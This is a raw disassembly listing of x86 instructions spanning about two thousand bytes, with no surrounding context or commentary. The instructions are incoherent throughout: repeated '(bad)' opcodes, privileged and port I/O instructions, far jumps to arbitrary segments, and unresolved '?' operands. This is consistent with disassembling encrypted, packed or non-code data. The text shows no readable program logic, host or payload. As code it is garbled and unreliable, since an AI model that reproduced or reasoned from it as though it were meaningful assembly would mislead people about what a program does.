  4190b3:	fidivr DWORD PTR [ecx+0x4899bdad]
  4190b9:	dec    ebx
  4190ba:	xor    eax,0xd64bef5d
  4190bf:	(bad)  
  4190c0:	call   0x7061:0xe8507bce
  4190c7:	xchg   esi,eax
  4190c8:	aas    
  4190c9:	clc    
  4190ca:	(bad)  
  4190cb:	mov    eax,ds:0x4275158c
  4190d0:	and    DWORD PTR [ebx],ebp
  4190d2:	ja     0x4190f8
  4190d4:	inc    ecx
  4190d5:	ss pop esi
  4190d7:	sbb    eax,0x479a597d
  4190dc:	mov    gs,esi
  4190de:	rcr    DWORD PTR [eax-0x21f204f8],0x2d
  4190e5:	mov    cl,0xed
  4190e7:	push   eax
  4190e8:	neg    BYTE PTR [ecx]
  4190ea:	(bad)
  4190ee:	or     al,bl
  4190f0:	outs   dx,DWORD PTR ds:[esi]
  4190f1:	ja     0x41912c
  4190f3:	clc    
  4190f4:	jae    0x419107
  4190f6:	inc    ecx
  4190f7:	jmp    0x4b0e5451
  4190fc:	or     BYTE PTR [edx+0x3f10d511],al
  419102:	pop    ds
  419103:	(bad)  
  419104:	mov    dh,0x70
  419106:	sbb    al,bh
  419108:	outs   dx,DWORD PTR ds:[esi]
  419109:	(bad)  
  41910a:	ins    DWORD PTR es:[edi],dx
  41910b:	es pop ebx
  41910d:	and    eax,0x923617fd
  419112:	pop    edx
  419113:	inc    ebx
  419114:	mov    al,BYTE PTR [esi+0x188602a1]
  41911a:	and    BYTE PTR [edi-0x7ea72d27],ch
  419120:	dec    edi
  419121:	add    BYTE PTR [esi*2-0x186e8736],al
  419128:	mov    ds:0x87c189fc,eax
  41912d:	shl    dh,0xa0
  419130:	mov    BYTE PTR [ecx+ecx*1+0x3d0b8bce],cl
  419137:	mov    dl,0x41
  419139:	mov    ah,0x1
  41913b:	lahf   
  41913c:	push   ebx
  41913d:	jge    0x419131
  41913f:	test   DWORD PTR [ecx],ebp
  419141:	push   edx
  419142:	xchg   ecx,eax
  419143:	sub    BYTE PTR [edx+0x24afcb8d],bl
  419149:	ret    0x1044
  41914c:	pop    edx
  41914d:	push   0x26b7e403
  419152:	dec    edx
  419153:	and    bh,BYTE PTR [ebx+0x59]
  419156:	mov    ebp,0x1095b9d6
  41915b:	pop    ecx
  41915c:	stos   DWORD PTR es:[edi],eax
  41915d:	push   esp
  41915e:	cld    
  41915f:	cmp    al,0xca
  419161:	xchg   esp,eax
  419162:	leave  
  419163:	enter  0xf43a,0x76
  419167:	rcl    DWORD PTR [ebx],1
  419169:	(bad)
  41916c:	out    0xec,eax
  41916e:	mov    ebp,0xae954c20
  419173:	fcmovbe st,st(0)
  419175:	(bad)  
  419177:	ror    BYTE PTR [ecx],1
  419179:	aas    
  41917a:	mov    DWORD PTR [ecx-0x23],eax
  41917d:	push   edi
  41917e:	loop   0x4191f4
  419180:	ret    0x18ef
  419183:	pop    ds
  419184:	scas   eax,DWORD PTR es:[edi]
  419185:	xor    eax,0xa5738951
  41918a:	push   eax
  41918b:	sbb    DWORD PTR [edi+0x32],edi
  41918e:	lahf   
  41918f:	inc    esp
  419190:	mov    bh,0x1f
  419192:	xchg   esp,eax
  419193:	ds jmp 0xd358:0x233255cf
  41919b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41919c:	inc    ebp
  41919d:	add    al,bh
  41919f:	arpl   WORD PTR [edi+0x12],si
  4191a2:	sbb    dh,0xa
  4191a5:	(bad)  
  4191a6:	jp     0x41913c
  4191a8:	dec    cx
  4191aa:	add    dl,BYTE PTR [esi+0x78]
  4191ad:	sub    esi,edx
  4191af:	jbe    0x419226
  4191b1:	xor    eax,0x4221098e
  4191b6:	repnz pop esp
  4191b8:	push   ebx
  4191b9:	pop    ds
  4191ba:	jno    0x4191c3
  4191bc:	and    cl,ah
  4191be:	shrd   DWORD PTR [ecx-0x5e],esi,cl
  4191c2:	xor    eax,0xc6b25601
  4191c7:	icebp  
  4191c8:	xchg   edx,eax
  4191c9:	push   edx
  4191ca:	push   ds
  4191cb:	nop
  4191cc:	mov    bh,0x3e
  4191ce:	mov    eax,0xe8a75998
  4191d3:	ret    
  4191d4:	push   ds
  4191d5:	mov    bh,0xad
  4191d7:	in     eax,dx
  4191d8:	lds    edx,FWORD PTR [eax+edi*4]
  4191db:	and    al,0xe0
  4191dd:	hlt    
  4191de:	fidivr WORD PTR [eax+0x55]
  4191e1:	push   es
  4191e2:	sti    
  4191e3:	jmp    0xcc0d36e4
  4191e8:	jmp    0x31440d0e
  4191ed:	and    al,0x2e
  4191ef:	rol    esp,0xb7
  4191f2:	sbb    BYTE PTR [edx+0x60985cd3],dl
  4191f8:	jle    0x41922a
  4191fa:	push   edi
  4191fb:	into   
  4191fc:	test   al,0x29
  4191fe:	in     eax,0x5b
  419200:	or     ah,cl
  419202:	rol    DWORD PTR [edx],1
  419204:	aam    0x84
  419206:	js     0x4191bf
  419208:	outs   dx,DWORD PTR ds:[esi]
  419209:	sub    al,0xe0
  41920b:	xchg   ecx,eax
  41920c:	icebp  
  41920d:	hlt    
  41920e:	xchg   ebx,eax
  41920f:	mov    DWORD PTR [edx],0xf7ad4ed8
  419215:	add    bl,BYTE PTR [edx+ebx*4-0x4d]
  419219:	cmp    eax,0x6cb1a893
  41921e:	ja     0x419285
  419220:	mov    eax,0xf30b3c9a
  419225:	push   ds
  419226:	js     0x4191e8
  419228:	int    0x95
  41922a:	and    DWORD PTR [ecx],eax
  41922c:	(bad)  
  41922d:	dec    ebx
  41922e:	jo     0x419285
  419230:	mov    ebx,0x40e9fa49
  419235:	dec    esp
  419236:	out    dx,eax
  419237:	outs   dx,BYTE PTR ds:[esi]
  419238:	ror    DWORD PTR ss:[esi-0x73],cl
  41923c:	fsubr  QWORD PTR ds:[eax+0x15]
  419240:	xor    bh,dl
  419242:	mov    bh,0x6
  419244:	call   0xf0a81a34
  419249:	mov    esi,0x7af20e81
  41924e:	mov    WORD PTR [eax+ebx*1+0x38],cs
  419252:	push   edi
  419253:	sub    DWORD PTR ds:0x8e7253be,0x66
  41925a:	adc    bh,bh
  41925c:	inc    eax
  41925d:	ds hlt 
  41925f:	and    ecx,DWORD PTR [ebx+0x53d9d566]
  419265:	mov    WORD PTR [ebx+0x6f6b8ddb],fs
  41926b:	push   esi
  41926c:	jo     0x41928f
  41926e:	dec    eax
  41926f:	sub    BYTE PTR [edx],ah
  419271:	jo     0x419285
  419273:	jb     0x419230
  419275:	popa   
  419276:	les    edi,FWORD PTR [edi]
  419278:	imul   edi,DWORD PTR [ecx-0x23f7ead5],0x631b27e5
  419282:	xchg   ecx,eax
  419283:	dec    ebp
  419284:	cli    
  419285:	outs   dx,DWORD PTR ds:[esi]
  419286:	dec    ebp
  419287:	cmp    BYTE PTR [edx-0x12557fd1],0x1
  41928e:	mov    ds:0xb938795b,al
  419293:	adc    eax,0xcee32d95
  419298:	push   ebp
  419299:	xor    al,0xfb
  41929b:	mov    ecx,DWORD PTR [ebx+0x2558bb04]
  4192a1:	and    al,0x45
  4192a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192a4:	out    0x5a,eax
  4192a6:	pop    ds
  4192a7:	or     DWORD PTR [eax-0x33],eax
  4192aa:	loop   0x4192f8
  4192ac:	test   dl,al
  4192ae:	cmp    eax,0x42d5b1df
  4192b3:	repnz ds test eax,0x4cf5f29
  4192ba:	addr16 pop ss
  4192bc:	mov    esi,0xecb9b644
  4192c1:	sub    eax,0x6c820114
  4192c6:	cmp    BYTE PTR [eax+0x1e],bl
  4192c9:	(bad)  
  4192ca:	in     eax,dx
  4192cb:	xchg   ecx,eax
  4192cc:	fisubr DWORD PTR [ebx+0x31a52ee7]
  4192d2:	cmp    al,0xb6
  4192d4:	(bad)  
  4192d5:	icebp  
  4192d6:	ds aam 0x95
  4192d9:	mov    bl,0x58
  4192db:	inc    edx
  4192dc:	pop    eax
  4192dd:	or     dh,BYTE PTR [ebx-0x41]
  4192e0:	cmp    BYTE PTR [ecx+0x6],ch
  4192e3:	push   eax
  4192e4:	cwde   
  4192e5:	and    edx,DWORD PTR [ebx+0x6cd21949]
  4192eb:	push   ecx
  4192ec:	into   
  4192ed:	push   eax
  4192ee:	mul    DWORD PTR [edi]
  4192f0:	jne    0x4192bc
  4192f2:	fnstsw WORD PTR [bx]
  4192f5:	xor    cl,ch
  4192f7:	or     BYTE PTR [esp+edx*4+0x5a203559],bl
  4192fe:	pop    ebx
  4192ff:	clc    
  419300:	daa    
  419301:	pop    eax
  419302:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419303:	nop
  419304:	iret   
  419305:	push   edx
  419306:	imul   esi,DWORD PTR [edi-0x60],0xefa6a3a1
  41930d:	xor    cl,BYTE PTR [eax+0x6e]
  419310:	(bad)  
  419312:	add    dl,bl
  419314:	stos   BYTE PTR es:[edi],al
  419315:	fisttp WORD PTR [edi+0x50]
  419318:	sub    bh,BYTE PTR [edi+0x50]
  41931b:	mov    cl,0x3c
  41931d:	sub    BYTE PTR [ecx+eax*2+0x49982e3],al
  419324:	aad    0x5d
  419326:	loop   0x419330
  419328:	jb     0x4192c5
  41932a:	(bad)
  41932e:	in     al,0xa7
  419330:	(bad)  
  419332:	cmp    eax,0x4a709479
  419337:	in     al,0xdf
  419339:	xchg   BYTE PTR [edi+0x22],dl
  41933c:	xchg   edx,eax
  41933d:	out    0xff,eax
  41933f:	mov    ebp,0x9a582ac4
  419344:	and    DWORD PTR [edi-0x3c],esi
  419347:	add    BYTE PTR [edx+ecx*2-0x3ee7fa7f],bh
  41934e:	in     eax,dx
  41934f:	rol    cl,1
  419351:	(bad)  
  419353:	jp     0x419365
  419355:	sub    BYTE PTR [edi-0x777957f0],ah
  41935b:	loop   0x41939f
  41935d:	push   esp
  41935e:	aas    
  41935f:	inc    DWORD PTR [esi-0x24]
  419362:	jns    0x41935e
  419364:	(bad)  
  419365:	push   ds
  419366:	(bad)  
  419367:	mov    eax,0xf3816c0e
  41936c:	mov    ch,0xc3
  41936e:	repnz mov esi,0x1f6bb602
  419374:	jmp    0x4193cc
  419376:	int3   
  419377:	mov    ah,0x4e
  419379:	sti    
  41937a:	mov    dl,0xd3
  41937c:	and    esi,0xfffffff7
  41937f:	shl    DWORD PTR [edi],cl
  419381:	inc    ebx
  419382:	mov    esi,0xe36cd4e6
  419387:	js     0x41938c
  419389:	js     0x41934c
  41938b:	mov    al,ds:0x7fe85406
  419390:	add    al,0xcc
  419392:	out    0x34,al
  419394:	test   BYTE PTR [edx],al
  419396:	loopne 0x419330
  419398:	mov    bh,0x81
  41939b:	sub    esp,DWORD PTR [eax+esi*8]
  41939e:	cmp    eax,0x181c1cab
  4193a3:	pushf  
  4193a4:	sahf   
  4193a5:	sbb    eax,0xe7efae5d
  4193aa:	cwde   
  4193ab:	daa    
  4193ac:	xlat   BYTE PTR ds:[ebx]
  4193ad:	pop    ecx
  4193ae:	jns    0x4193af
  4193b0:	xlat   BYTE PTR ds:[ebx]
  4193b1:	mov    edx,0x2ac08b6f
  4193b6:	bnd jne 0x4193c7
  4193b9:	xor    al,0xbf
  4193bb:	repz das 
  4193bd:	pop    ds
  4193be:	lods   al,BYTE PTR ds:[esi]
  4193bf:	and    eax,0x50e7537
  4193c4:	aam    0x1
  4193c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193c7:	fwait
  4193c8:	aaa    
  4193c9:	adc    ch,BYTE PTR [edx]
  4193cb:	mov    edx,0x9d280c5f
  4193d0:	cmp    eax,0x30
  4193d3:	jmp    0xa2a6:0x5b32ad20
  4193da:	xchg   DWORD PTR [eax+0x13f9c822],esi
  4193e0:	mov    esp,0xb628d3a0
  4193e5:	sub    esp,DWORD PTR [ebp+0x3f]
  4193e8:	bound  edi,QWORD PTR [esi-0x68]
  4193eb:	cmc    
  4193ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193ed:	(bad)  
  4193ee:	xor    ebx,DWORD PTR [ecx+0x7a]
  4193f1:	cmc    
  4193f2:	cmp    dl,BYTE PTR [edx+0x41]
  4193f5:	add    BYTE PTR [esi],ah
  4193f7:	enter  0xa135,0x1
  4193fb:	mov    ecx,0x26bbe521
  419400:	inc    DWORD PTR [ecx]
  419402:	call   0x419026a3
  419407:	pop    edi
  419408:	cmp    al,0x57
  41940a:	ins    DWORD PTR es:[edi],dx
  41940b:	push   ebx
  41940c:	(bad)  
  41940d:	std    
  41940e:	cmp    eax,0xb9241d08
  419413:	mov    DWORD PTR [edi],edi
  419415:	pop    edx
  419416:	sub    al,0x37
  419418:	inc    esp
  419419:	dec    edi
  41941a:	fdiv   st(0),st
  41941c:	sbb    BYTE PTR [edx+edx*1-0x38],cl
  419420:	mov    al,0xb6
  419422:	test   BYTE PTR fs:[ecx-0x1b],0x6e
  419427:	jnp    0x419448
  419429:	clc    
  41942a:	or     bl,BYTE PTR [esi*4-0x136cd7b9]
  419431:	sar    DWORD PTR [eax-0x71],1
  419434:	stos   BYTE PTR es:[edi],al
  419435:	mov    ds:0xb00b42d3,eax
  41943a:	daa    
  41943b:	dec    ebp
  41943c:	xchg   ecx,eax
  41943d:	lds    edx,FWORD PTR [eax]
  41943f:	push   0x7f671a83
  419444:	inc    ecx
  419445:	lds    edx,FWORD PTR [edi-0x1831c745]
  41944b:	mov    ecx,0xc57bf314
  419450:	ret    
  419451:	xchg   DWORD PTR [edi-0x2cb638c1],ebx
  419457:	cmp    eax,DWORD PTR [edi]
  419459:	scas   eax,DWORD PTR es:[edi]
  41945a:	jmp    ebp
  41945c:	aas    
  41945d:	ins    BYTE PTR es:[edi],dx
  41945e:	out    0x3d,eax
  419460:	ret    0x1fe
  419463:	pop    ebp
  419464:	sub    DWORD PTR [esp+edi*4-0x21],esp
  419468:	sar    edi,cl
  41946a:	(bad)  
  41946b:	pop    edi
  41946c:	sahf   
  41946d:	int3   
  41946e:	sbb    BYTE PTR [ebp-0x52],cl
  419471:	mov    ebp,0x2a54f20b
  419476:	mov    eax,ds:0xa39dbd55
  41947b:	out    0x77,al
  41947d:	mov    dl,0x8a
  41947f:	pop    esp
  419480:	sbb    ebx,ebp
  419482:	xor    al,0x3d
  419484:	enter  0x2c71,0xa4
  419488:	jbe    0x41941b
  41948a:	ins    BYTE PTR es:[edi],dx
  41948b:	test   BYTE PTR [bp+si],ch
  41948e:	push   ebx
  41948f:	outs   dx,DWORD PTR ds:[esi]
  419490:	(bad)  
  419491:	paddusw mm1,QWORD PTR [esp+eiz*4+0x302a9429]
  419499:	push   ebp
  41949a:	inc    edi
  41949b:	not    DWORD PTR [ecx+0x75]
  41949e:	jmp    0x41948f
  4194a0:	inc    esi
  4194a1:	jl     0x419459
  4194a3:	mov    dl,0xd9
  4194a5:	lea    ebp,[edx]
  4194a7:	xchg   ebx,eax
  4194a8:	ss jb  0x41950b
  4194ab:	(bad)  
  4194ac:	sbb    al,0x53
  4194ae:	lock sbb al,0x25
  4194b1:	or     edx,DWORD PTR [ecx]
  4194b3:	jmp    0x419527
  4194b5:	(bad)
  4194b9:	stos   DWORD PTR es:[edi],eax
  4194ba:	dec    edx
  4194bb:	test   dl,ah
  4194bd:	cmp    bh,dh
  4194bf:	je     0x419474
  4194c1:	arpl   WORD PTR [eax],cx
  4194c3:	lds    esi,FWORD PTR [esi]
  4194c5:	pop    ebx
  4194c6:	or     ah,BYTE PTR [ebx]
  4194c8:	inc    esp
  4194c9:	retf   
  4194ca:	inc    ecx
  4194cb:	das    
  4194cc:	or     BYTE PTR [ebp-0x2c],cl
  4194cf:	mov    bl,0x7a
  4194d1:	or     ch,dl
  4194d3:	fst    DWORD PTR [edi+0x3e]
  4194d6:	imul   edi,DWORD PTR [esp+esi*8],0x439361fe
  4194dd:	mov    ch,0x1b
  4194df:	xchg   ebp,eax
  4194e0:	push   cs
  4194e1:	test   DWORD PTR [ecx+0x59],eax
  4194e4:	int    0x71
  4194e6:	jmp    0xf778:0xed011173
  4194ed:	mov    ah,0xf8
  4194ef:	sub    bh,al
  4194f1:	add    BYTE PTR [eax+0x67],ah
  4194f4:	and    al,0xd5
  4194f6:	or     BYTE PTR [esi],cl
  4194f8:	out    0x43,eax
  4194fa:	jns    0x419520
  4194fc:	scas   eax,DWORD PTR es:[edi]
  4194fd:	adc    DWORD PTR [esi-0x6d],esp
  419500:	inc    eax
  419501:	in     al,dx
  419502:	ss mov eax,esp
  419505:	dec    ecx
  419506:	jb     0x4194e1
  419508:	sbb    DWORD PTR [edi+ebx*8],0x56
  41950c:	sub    bl,bh
  41950e:	push   0x60
  419510:	ins    BYTE PTR es:[edi],dx
  419511:	dec    edx
  419512:	sub    eax,0xc8a567d8
  419517:	pop    esp
  419518:	fbld   TBYTE PTR [ebp-0x6e9fecd0]
  41951e:	add    al,0xf1
  419520:	add    al,0x8
  419522:	cmp    BYTE PTR [ecx+0x60d2cd8b],bh
  419528:	jne    0x41958d
  41952a:	ret    
  41952b:	push   esi
  41952c:	mov    bh,0xfe
  41952e:	(bad)  
  41952f:	ret    
  419530:	aam    0xfa
  419532:	push   es
  419533:	pop    esp
  419534:	jbe    0x4194d1
  419536:	bound  eax,QWORD PTR [edi]
  419538:	push   esp
  419539:	imul   eax,DWORD PTR [esi-0x6cbeb168],0x4b3b93f
  419543:	nop
  419544:	dec    eax
  419545:	sar    ebp,0xd
  419548:	fdiv   DWORD PTR [edi]
  41954a:	xchg   edi,eax
  41954b:	jne    0x41954a
  41954d:	pop    ebx
  41954e:	shr    DWORD PTR [ebx],0x7e
  419551:	fsincos 
  419553:	mov    cl,0x7a
  419555:	lahf   
  419556:	pop    eax
  419557:	sub    al,0x70
  419559:	and    esp,DWORD PTR [edx]
  41955b:	cmc    
  41955c:	in     al,dx
  41955d:	sub    eax,0x55e20afa
  419562:	data16 arpl WORD PTR [ecx+0x53],bx
  419566:	fmul   st,st(3)
  419568:	xor    bh,cl
  41956a:	shr    bh,1
  41956c:	rcl    DWORD PTR [edx],cl
  41956e:	sahf   
  41956f:	sbb    ah,ch
  419571:	push   edx
  419572:	test   al,0x3d
  419574:	inc    esi
  419575:	xchg   BYTE PTR [eax+0x4d],bl
  419578:	dec    edx
  419579:	inc    esp
  41957a:	clc    
  41957b:	push   esi
  41957c:	add    eax,0xcdc7065b
  419581:	(bad)  
  419582:	and    al,0xc4
  419584:	stos   BYTE PTR es:[edi],al
  419585:	mov    dl,0x87
  419587:	aas    
  419588:	dec    eax
  419589:	mov    edi,0x7670927c
  41958e:	aas    
  41958f:	cmp    esi,DWORD PTR [eax+ebx*1-0x5732c04e]
  419596:	ins    BYTE PTR es:[edi],dx
  419597:	es out 0x1e,eax
  41959a:	addr16 dec ebx
  41959c:	jae    0x4195c0
  41959e:	adc    ecx,DWORD PTR [edi]
  4195a0:	adc    eax,0xd096ef7a
  4195a5:	addr16 int3 
  4195a7:	jnp    0x419556
  4195a9:	xchg   edi,eax
  4195aa:	jecxz  0x41955e
  4195ac:	cmp    al,BYTE PTR [edx-0x31]
  4195af:	jno    0x419606
  4195b1:	ret    0x4ea7
  4195b4:	xchg   ebx,eax
  4195b5:	cwde   
  4195b6:	lds    esp,FWORD PTR [ebp+0x46a88dd]
  4195bc:	adc    DWORD PTR [ebx],esi
  4195be:	xchg   edx,eax
  4195bf:	mov    dl,0x9b
  4195c1:	call   0xa7f7:0xdc494bf5
  4195c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195c9:	dec    edi
  4195ca:	daa    
  4195cb:	arpl   WORD PTR [eax+0x79],ax
  4195ce:	stc    
  4195cf:	fimul  WORD PTR [ebp-0x79]
  4195d2:	lea    ebp,[ebx+0x513c96f7]
  4195d8:	inc    ecx
  4195d9:	js     0x4195b0
  4195db:	dec    ebp
  4195dc:	fiadd  DWORD PTR [ebp+0x12]
  4195df:	mov    ebp,DWORD PTR [esi+0x10fe8cbd]
  4195e5:	stos   BYTE PTR es:[edi],al
  4195e6:	add    eax,0x3892c203
  4195eb:	and    edx,DWORD PTR [edx+0x49]
  4195ee:	sti    
  4195ef:	fsubr  QWORD PTR [eax]
  4195f1:	dec    edi
  4195f2:	sbb    eax,0xad71828e
  4195f7:	mov    esp,0xacbf9bc6
  4195fc:	test   eax,0xa02f2162
  419601:	or     al,0x6c
  419603:	je     0x419650
  419605:	dec    DWORD PTR [esi+0x37]
  419608:	cmp    BYTE PTR [ecx+0x35efa2ce],ah
  41960e:	imul   edx,DWORD PTR [edi-0x13],0xffffffa0
  419612:	sub    DWORD PTR [edi+0x8],esp
  419615:	jl     0x4195d7
  419617:	jmp    0x8f9cd57a
  41961c:	rcr    BYTE PTR [esi],0x3d
  41961f:	xchg   ebp,eax
  419620:	iret   
  419621:	add    ecx,DWORD PTR [eax-0x46]
  419624:	in     al,0xbb
  419626:	(bad)  
  419627:	ins    DWORD PTR es:[edi],dx
  419628:	and    al,0x9f
  41962a:	add    BYTE PTR [ebx],cl
  41962c:	(bad)  
  41962d:	hlt    
  41962e:	push   edx
  41962f:	fcom   DWORD PTR [ebx+0x734b4a19]
  419635:	mov    DWORD PTR [eax-0x1],ebp
  419638:	int3   
  419639:	xchg   edx,eax
  41963a:	jl     0x4195f0
  41963c:	sbb    eax,0x1c2fcab3
  419641:	push   esi
  419642:	popa   
  419643:	ds ins DWORD PTR es:[edi],dx
  419645:	sub    bh,0xd8
  419648:	mov    bh,0x43
  41964a:	mov    ds:0x32edd011,al
  41964f:	push   es
  419650:	daa    
  419651:	xchg   edi,eax
  419652:	cli    
  419653:	sar    BYTE PTR [ebp-0x77081f48],1
  419659:	enter  0x3d50,0x61
  41965d:	clc    
  41965e:	ds lahf 
  419660:	rol    ebp,0xc9
  419663:	mov    edx,0xdf04aebf
  419668:	in     eax,dx
  419669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41966a:	loopne 0x419645
  41966c:	xor    DWORD PTR [ebx+0x4b716479],esp
  419672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419673:	jp     0x4196f4
  419675:	xor    al,0xa0
  419677:	pop    esi
  419678:	mov    ebp,0x157394a0
  41967d:	sub    BYTE PTR [edi-0x326cbac9],bh
  419683:	sbb    DWORD PTR [edx+0x4b],esi
  419686:	push   esi
  419687:	clc    
  419688:	stc    
  419689:	cmp    DWORD PTR [edx+edx*4+0x410da8fe],eax
  419690:	cwde   
  419691:	ins    BYTE PTR es:[edi],dx
  419692:	dec    edx
  419693:	jle    0x419635
  419695:	xchg   esp,eax
  419696:	mov    DWORD PTR [ebx],edx
  419698:	stos   BYTE PTR es:[edi],al
  419699:	xor    al,0x66
  41969b:	push   edx
  41969c:	push   cs
  41969d:	shr    BYTE PTR [edx+0x103367a],0xc8
  4196a4:	aad    0x54
  4196a6:	daa    
  4196a7:	inc    ebp
  4196a8:	lds    ebp,FWORD PTR [esi]
  4196aa:	stos   BYTE PTR es:[edi],al
  4196ab:	imul   ebp,DWORD PTR [ebx+0x40a93561],0x53
  4196b2:	push   eax
  4196b3:	xor    al,0x1d
  4196b5:	retf   
  4196b6:	or     bl,al
  4196b8:	inc    ebp
  4196b9:	pop    ecx
  4196ba:	outs   dx,BYTE PTR ds:[esi]
  4196bb:	sub    eax,0x42a1248d
  4196c0:	leave  
  4196c1:	adc    DWORD PTR [ebx-0x53746de2],edi
  4196c7:	ins    BYTE PTR es:[edi],dx
  4196c8:	cwde   
  4196c9:	fwait
  4196ca:	xchg   BYTE PTR [edi-0x1b],ah
  4196cd:	pop    edx
  4196ce:	fisub  WORD PTR [edi+0x5eaf4a8f]
  4196d4:	xlat   BYTE PTR ds:[ebx]
  4196d5:	sbb    eax,0xa916bfa4
  4196da:	imul   esi,esi,0x33
  4196dd:	sbb    DWORD PTR [ebp+ebp*2-0x46],ecx
  4196e1:	or     ah,bh
  4196e3:	inc    edx
  4196e4:	pusha  
  4196e5:	pop    ecx
  4196e6:	arpl   di,bx
  4196e8:	mov    ?,WORD PTR ds:0x9f3b1312
  4196ee:	pop    edx
  4196ef:	mov    ebp,edx
  4196f1:	imul   ebp,DWORD PTR [ebp-0x30],0xf68094e6
  4196f8:	or     ebp,edi
  4196fa:	std    
  4196fb:	aad    0xd2
  4196fd:	mov    ch,0xc8
  4196ff:	das    
  419700:	sbb    al,0x6
  419702:	and    DWORD PTR [ecx+0x7f],edx
  419705:	cmp    al,0x58
  419707:	push   esi
  419708:	jns    0x41973e
  41970a:	jmp    0x76169591
  41970f:	in     al,0x4b
  419711:	outs   dx,BYTE PTR ds:[esi]
  419712:	imul   ebp,DWORD PTR [ecx-0x4708cbb5],0xab1bf7e
  41971c:	es iret 
  41971e:	pop    edi
  41971f:	iret   
  419720:	rdmsr  
  419722:	(bad)  
  419724:	mov    bl,0x1d
  419726:	dec    esi
  419727:	mov    ds:0x5d06220a,eax
  41972c:	jnp    0x4196c0
  41972e:	js     0x41972f
  419730:	and    ah,BYTE PTR [ecx+0x46]
  419733:	jno    0x419756
  419735:	and    eax,0xad29bbf2
  41973a:	fidiv  WORD PTR [ebp+0x2c]
  41973d:	mov    dl,0x8f
  41973f:	inc    eax
  419740:	mov    ah,0x38
  419742:	cmp    eax,0xd70481ae
  419747:	pop    ds
  419748:	inc    edx
  419749:	mov    al,0xef
  41974b:	repz xchg ecx,eax
  41974d:	cmp    BYTE PTR [esi+ecx*4],al
  419750:	xchg   DWORD PTR [eax],esi
  419752:	jno    0x4196e2
  419754:	fdivr  QWORD PTR [ecx-0x5f68536c]
  41975a:	jg     0x4197c0
  41975c:	push   esp
  41975d:	pop    ebp
  41975e:	stos   DWORD PTR es:[edi],eax
  41975f:	mov    al,0x2e
  419761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419762:	mov    ah,0xce
  419764:	icebp  
  419765:	test   BYTE PTR [eax+0x58],0xd9
  419769:	mov    ah,BYTE PTR [edi+0xa3362ef]
  41976f:	jg     0x4197dd
  419771:	cmp    al,0xea
  419773:	jne    0x41971c
  419775:	lds    eax,FWORD PTR [ecx-0x5a]
  419778:	inc    ebx
  419779:	cs jge 0x419769
  41977c:	mov    ?,WORD PTR [edi+0x17]
  41977f:	stos   BYTE PTR es:[edi],al
  419780:	retf   
  419781:	mov    dh,0x29
  419783:	push   edx
  419784:	lahf   
  419785:	pop    es
  419786:	in     eax,dx
  419787:	pop    esi
  419788:	imul   esi,edi,0x6f06f3bb
  41978e:	jnp    0x4197ad
  419790:	sbb    BYTE PTR [ecx-0x6c],bh
  419793:	mov    dl,0xc4
  419795:	push   ecx
  419796:	clc    
  419797:	push   es
  419798:	gs inc ecx
  41979a:	dec    esp
  41979b:	jecxz  0x41977f
  41979d:	hlt    
  41979e:	jle    0x419750
  4197a0:	gs push esi
  4197a2:	mov    ch,0x57
  4197a4:	mov    ds:0xdb1720ce,eax
  4197a9:	add    esp,DWORD PTR [esi+eiz*1-0x5a]
  4197ad:	(bad)  
  4197ae:	in     eax,0x84
  4197b0:	dec    esi
  4197b1:	leave  
  4197b2:	cwde   
  4197b3:	sbb    BYTE PTR [ebp-0x3018c4ff],bh
  4197b9:	int3   
  4197ba:	mov    dh,0x14
  4197bc:	push   ebx
  4197bd:	xor    eax,0x9a26440f
  4197c2:	enter  0x3204,0xe3
  4197c6:	cmp    DWORD PTR [ebx],esp
  4197c8:	stos   DWORD PTR es:[edi],eax
  4197c9:	pop    esi
  4197ca:	lods   al,BYTE PTR ds:[esi]
  4197cb:	xchg   edi,eax
  4197cc:	loope  0x419786
  4197ce:	popa   
  4197cf:	aam    0xa6
  4197d1:	sub    ecx,DWORD PTR [ecx+0x3d]
  4197d4:	(bad)  
  4197d5:	fisub  WORD PTR [edx+edi*8+0x45]
  4197d9:	adc    bl,BYTE PTR [edi+0x8]
  4197dc:	or     dl,BYTE PTR [ecx]
  4197de:	dec    esp
  4197df:	loop   0x41976d
  4197e1:	pop    esp
  4197e2:	emms   
  4197e4:	sub    al,0x97
  4197e6:	adc    eax,0x4164683
  4197eb:	adc    bh,BYTE PTR [eax+edi*8]
  4197ee:	or     ebx,ebp
  4197f0:	mov    dh,0xc8
  4197f2:	iret   
  4197f3:	(bad)  
  4197f4:	sub    dh,BYTE PTR [esi]
  4197f6:	ins    BYTE PTR es:[edi],dx
  4197f7:	mov    BYTE PTR [edx-0x2920006b],bl
  4197fd:	daa    
  4197fe:	sub    eax,ebx
  419800:	lahf   
  419801:	leave  
  419802:	out    0x3f,eax
  419804:	popf   
  419805:	mov    ds:0xf5a18bf2,eax
  41980a:	cdq    
  41980b:	ins    BYTE PTR es:[edi],dx
  41980c:	es nop
  41980e:	ins    DWORD PTR es:[edi],dx
  41980f:	mov    ss,WORD PTR [edi+0x68]
  419812:	push   cs
  419813:	xor    eax,0xd748d865
  419818:	or     DWORD PTR [esi+0x61072067],esi
  41981e:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  419820:	push   ss
  419821:	test   eax,0xe6fa5aed
  419826:	ins    DWORD PTR es:[edi],dx
  419827:	leave  
  419828:	add    eax,0x46f43168
  41982d:	ins    BYTE PTR es:[edi],dx
  41982e:	loopne 0x4197dc
  419830:	mov    esi,0xf4334081
  419835:	out    dx,al
  419836:	xor    esp,ecx
  419838:	and    DWORD PTR [eax],eax
  41983a:	inc    eax
  41983b:	fld    TBYTE PTR [ecx+edi*1+0x1d]
  41983f:	push   ebp
  419840:	jae    0x4197fc
  419842:	dec    esp
  419844:	xor    eax,0x69536fb0
  419849:	icebp  
  41984a:	stc    
  41984b:	mov    dh,0x9c
  41984d:	cmp    al,BYTE PTR [edx-0x4569c51a]
  419853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419854:	aam    0x15
  419856:	xor    BYTE PTR [ecx-0x5d],ch
  419859:	or     BYTE PTR [esi],ch
